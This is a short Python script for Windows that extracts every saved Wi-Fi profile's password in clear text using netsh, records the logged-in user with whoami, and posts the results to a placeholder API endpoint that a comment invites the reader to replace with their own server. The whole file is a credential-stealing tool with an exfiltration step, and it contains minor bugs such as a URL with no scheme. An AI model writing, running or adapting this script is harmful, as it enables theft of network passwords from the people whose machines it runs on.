import subprocess
import requests

output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
output = output.decode('utf-8')
user = subprocess.check_output(['whoami'])
user = user.decode('utf-8').split("\\")[0]
lines = output.split('\n')

connections = []

for line in lines:
    if 'All User Profile' in line:
        connection_name = line.split(":")[1].strip()
        connections.append(connection_name)


def password_pulling(connection):
    connection_name = connection
    output = subprocess.check_output(['netsh', 'wlan', 'show', 
                                      'profile' , connection_name , 'key=clear'])
    output = output.decode('utf-8')
    
    lines = output.split('\n')
    
    for line in lines:
        if 'Key Content' in line:
            password = line.split(":")[1].strip()
            connections_and_passwords = {}
            connections_and_passwords[connection_name] = password
    return connections_and_passwords


datas = [{'user':user}]
for connection in connections:
    try:    
        data = password_pulling(connection)
        datas.append(data)
    except:
        data = {f"{connection} : Password Not Found"}
        datas.append(data)
        continue
#if you want it to store in a text file use this
# with open('wifi_passwords.txt' , 'a') as file:
#     file.write(f'{datas} \n')
print(datas)
    
#if you want to save it into your database connect your api here
URL = '127.0.0.1:8000/api'
try:
    response = requests.post(URL,datas)
    
    if response.status_code == 200:
        print('Uploaded Succesfully')
    else:
        print('Something Went Wrong')
except:
    print('Request Failed (Check URL)')
